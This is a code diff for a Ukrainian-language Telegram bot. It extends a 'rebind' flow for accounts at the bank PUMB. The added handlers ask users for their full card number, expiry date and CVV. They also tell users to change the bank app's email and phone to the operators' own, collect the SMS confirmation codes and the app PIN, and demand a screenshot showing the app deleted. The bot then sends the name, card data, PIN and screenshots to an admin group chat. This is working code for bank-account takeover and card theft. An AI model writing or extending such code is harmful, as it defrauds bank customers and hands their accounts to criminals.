@@ -2029,48 +2029,18 @@ async def _delayed_pumb_rebind_process(client_id: int, chat_id: int, state: FSMC
                 client_data = "\n".join(client_data_lines)
                 await db.update_session_client_data(client_id, client_data, status='registered')
 
-                await bot.send_message(chat_id=chat_id, text="Дякую! Всі скріншоти для перев'язу успішно прийнято.")
-
-                # Відправляємо всі 7 скріншотів у групу анкет (RUMMYSKUP) одним альбомом (MediaGroup)
-                try:
-                    from bot.config import get_anketa_chat_id, get_admin_id
-                    from bot.bot_registry import get_bot
-                    target_chat = get_anketa_chat_id() or get_admin_id()
-                    if target_chat and ordered_file_ids:
-                        pib_str = pib_val if (pib_val and pib_val not in ('—', '-')) else "Не вказано"
-
-                        caption_text = (
-                            f"Перев'яз ПУМБ\n\n"
-                            f"ПІБ - {pib_str}"
-                        )
-
-                        if buffered_photos:
-                            media_group = []
-                            for idx, b_file in enumerate(buffered_photos):
-                                if idx == 0:
-                                    media_group.append(InputMediaPhoto(media=b_file, caption=caption_text, parse_mode="HTML"))
-                                else:
-                                    media_group.append(InputMediaPhoto(media=b_file))
-
-                            sender_bots = [bot]
-                            main_b = get_bot()
-                            if main_b and main_b != bot:
-                                sender_bots.append(main_b)
-
-                            for s_bot in sender_bots:
-                                try:
-                                    if len(media_group) > 1:
-                                        await s_bot.send_media_group(chat_id=target_chat, media=media_group)
-                                    else:
-                                        await s_bot.send_photo(chat_id=target_chat, photo=buffered_photos[0], caption=caption_text, parse_mode="HTML")
-                                    logger.info(f"Альбом ПУМБ перев'язу успішно надіслано в чат {target_chat}")
-                                    break
-                                except Exception as send_err:
-                                    logger.warning(f"Невдала спроба відправки альбому через бота: {send_err}")
-                except Exception as e:
-                    logger.error(f"Помилка відправки альбому ПУМБ перев'язу в групу: {e}")
-
-                await state.clear()
+                await bot.send_message(
+                    chat_id=chat_id,
+                    text=(
+                        "💳 **Надішліть, будь ласка, дані вашої головної гривневої картки ПУМБ:**\n\n"
+                        "• **Номер картки** (16 цифр)\n"
+                        "• **Термін дії** (мм/рр)\n"
+                        "• **CVV код** (3 цифри)\n\n"
+                        "Ви можете надіслати їх одним повідомленням текстом."
+                    ),
+                    parse_mode="Markdown"
+                )
+                await state.set_state(RegistrationStates.pumb_rebind_card_details)
                 return
 
             # 7. Надсилаємо інструкцію та приклад для наступного необхідного кроку
@@ -2084,6 +2054,196 @@ async def _delayed_pumb_rebind_process(client_id: int, chat_id: int, state: FSMC
                 chat_id=chat_id,
                 text="Виникла помилка під час перевірки фото. Будь ласка, надішліть скріншот ще раз."
             )
+
+
+@router.message(RegistrationStates.pumb_rebind_card_details, F.chat.type == "private")
+async def process_pumb_rebind_card_details(message: Message, state: FSMContext, bot: Bot):
+    """Прийом реквізитів картки ПУМБ від клієнта (текстом)."""
+    text = message.text or ""
+    if not text:
+        await message.answer("Будь ласка, надішліть реквізити картки текстом.")
+        return
+
+    await state.update_data(pumb_card_details_text=text)
+
+    target_email = await db.get_pumb_target_email()
+    await state.set_state(RegistrationStates.pumb_rebind_anketa_screenshot)
+    await message.answer(
+        f"📩 **Змініть анкетні дані у додатку ПУМБ:**\n\n"
+        f"• **Вкажіть пошту:** `{target_email}`\n\n"
+        f"*Після зміни надішліть скріншот вкладки «Анкетні дані».*",
+        parse_mode="Markdown"
+    )
+
+
+@router.message(RegistrationStates.pumb_rebind_anketa_screenshot, F.chat.type == "private")
+async def process_pumb_rebind_anketa_screenshot(message: Message, state: FSMContext, bot: Bot):
+    """Прийом скріншоту 'Анкетні дані'."""
+    if not message.photo:
+        await message.answer("Будь ласка, надішліть скріншот вкладки «Анкетні дані».")
+        return
+
+    file_id = message.photo[-1].file_id
+    await state.update_data(pumb_anketa_photo=file_id)
+
+    target_phone = await db.get_pumb_target_phone()
+    await state.set_state(RegistrationStates.pumb_rebind_phone_change)
+    await message.answer(
+        f"📱 **Тепер змініть номер телефону у додатку ПУМБ на наш номер:**\n"
+        f"`{target_phone}`\n\n"
+        f"*Коли прийде SMS-код підтвердження — надішліть його сюди.\n"
+        f"Після успішної зміни номера надішліть скріншот профілю ПУМБ, де видно наш новий номер.*",
+        parse_mode="Markdown"
+    )
+
+
+@router.message(RegistrationStates.pumb_rebind_phone_change, F.chat.type == "private")
+async def process_pumb_rebind_phone_change(message: Message, state: FSMContext, bot: Bot):
+    """Прийом SMS-коду або підтверджувального скріншоту зміни номера."""
+    if message.text:
+        sms_text = message.text.strip()
+        data = await state.get_data()
+        codes = data.get("pumb_sms_codes", [])
+        codes.append(sms_text)
+        await state.update_data(pumb_sms_codes=codes)
+
+        try:
+            from bot.database import log_chat_message
+            await log_chat_message(message.from_user.id, sms_text, sender='client')
+        except Exception:
+            pass
+
+        await message.answer("Дякую, код прийнято! Якщо прийде ще код — надішліть. Коли номер зміниться у додатку — надішліть скріншот профілю ПУМБ.")
+        return
+
+    if message.photo:
+        file_id = message.photo[-1].file_id
+        await state.update_data(pumb_phone_photo=file_id)
+
+        await state.set_state(RegistrationStates.pumb_rebind_pincode)
+        await message.answer(
+            "🔑 **Вкажіть ПІН-код / пароль, який ви встановили для входу в додаток ПУМБ:**",
+            parse_mode="Markdown"
+        )
+        return
+
+    await message.answer("Надішліть SMS-код або скріншот профілю з новим номером.")
+
+
+@router.message(RegistrationStates.pumb_rebind_pincode, F.chat.type == "private")
+async def process_pumb_rebind_pincode(message: Message, state: FSMContext, bot: Bot):
+    """Прийом ПІН-коду входу від клієнта."""
+    if not message.text:
+        await message.answer("Будь ласка, надішліть ПІН-код текстом.")
+        return
+
+    pincode = message.text.strip()
+    await state.update_data(pumb_pincode=pincode)
+
+    await state.set_state(RegistrationStates.pumb_rebind_deletion_screenshot)
+    await message.answer(
+        "🗑 **Надішліть скріншот видалення додатка ПУМБ з вашого телефону.**",
+        parse_mode="Markdown"
+    )
+
+
+@router.message(RegistrationStates.pumb_rebind_deletion_screenshot, F.chat.type == "private")
+async def process_pumb_rebind_deletion_screenshot(message: Message, state: FSMContext, bot: Bot):
+    """Фінал: прийом скріншоту видалення додатка ПУМБ, надсилання повного звіту та альбому в групу."""
+    if not message.photo:
+        await message.answer("Будь ласка, надішліть скріншот видалення додатка ПУМБ.")
+        return
+
+    deletion_photo = message.photo[-1].file_id
+    data = await state.get_data()
+
+    raw_collected = data.get("pumb_rebind_collected", {})
+    collected: dict[int, str] = {}
+    if isinstance(raw_collected, dict):
+        for k, v in raw_collected.items():
+            try:
+                collected[int(k)] = str(v)
+            except (ValueError, TypeError):
+                pass
+
+    ordered_file_ids = [collected[i] for i in range(7) if i in collected]
+    if data.get("pumb_anketa_photo"):
+        ordered_file_ids.append(data["pumb_anketa_photo"])
+    if data.get("pumb_phone_photo"):
+        ordered_file_ids.append(data["pumb_phone_photo"])
+    ordered_file_ids.append(deletion_photo)
+
+    client_id = message.from_user.id
+    await db.update_session_verification_data(client_id, success_photo_id=",".join(ordered_file_ids))
+
+    target_phone = await db.get_pumb_target_phone()
+    target_email = await db.get_pumb_target_email()
+    card_details = data.get("pumb_card_details_text", "Не вказано")
+    pincode = data.get("pumb_pincode", "Не вказано")
+
+    session = await db.get_session(client_id) or {}
+    pib_val = session.get('pib', 'Не вказано')
+    pib_str = pib_val if (pib_val and pib_val not in ('—', '-')) else "Не вказано"
+
+    final_report_text = (
+        f"{pib_str}\n\n"
+        f"{target_phone}\n"
+        f"{target_email}\n\n"
+        f"{card_details}\n\n"
+        f"{pincode}"
+    )
+
+    try:
+        from bot.config import get_anketa_chat_id, get_admin_id
+        from bot.bot_registry import get_bot
+        target_chat = get_anketa_chat_id() or get_admin_id()
+
+        if target_chat and ordered_file_ids:
+            from aiogram.types import InputMediaPhoto, BufferedInputFile
+            from io import BytesIO
+
+            buffered_photos = []
+            for idx, p_id in enumerate(ordered_file_ids[:10]):
+                try:
+                    file_info = await bot.get_file(p_id)
+                    buf = BytesIO()
+                    await bot.download_file(file_info.file_path, buf)
+                    buffered_photos.append(
+                        BufferedInputFile(buf.getvalue(), filename=f"photo_{idx}.jpg")
+                    )
+                except Exception as dl_err:
+                    logger.warning(f"Не вдалося завантажити фото {p_id} для фінального альбому: {dl_err}")
+
+            if buffered_photos:
+                media_group = []
+                for idx, b_file in enumerate(buffered_photos):
+                    if idx == 0:
+                        media_group.append(InputMediaPhoto(media=b_file, caption=f"Перев'яз ПУМБ (Фінал)\n\nПІБ - {pib_str}", parse_mode="HTML"))
+                    else:
+                        media_group.append(InputMediaPhoto(media=b_file))
+
+                sender_bots = [bot]
+                main_b = get_bot()
+                if main_b and main_b != bot:
+                    sender_bots.append(main_b)
+
+                for s_bot in sender_bots:
+                    try:
+                        if len(media_group) > 1:
+                            await s_bot.send_media_group(chat_id=target_chat, media=media_group)
+                        else:
+                            await s_bot.send_photo(chat_id=target_chat, photo=buffered_photos[0], caption=f"Перев'яз ПУМБ (Фінал)\n\nПІБ - {pib_str}", parse_mode="HTML")
+
+                        await s_bot.send_message(chat_id=target_chat, text=final_report_text)
+                        logger.info(f"Фінальний звіт ПУМБ успішно надіслано в чат {target_chat}")
+                        break
+                    except Exception as send_err:
+                        logger.warning(f"Невдала спроба відправки фінального звіту через бота: {send_err}")
+    except Exception as e:
+        logger.error(f"Помилка відправки фінального звіту ПУМБ: {e}")
+
+    await message.answer("Дякую! Усі етапи перев'язу успішно завершено.")
+    await state.clear()
 
 
 @router.message(RegistrationStates.pumb_rebind_screenshots, F.chat.type == "private", F.photo)
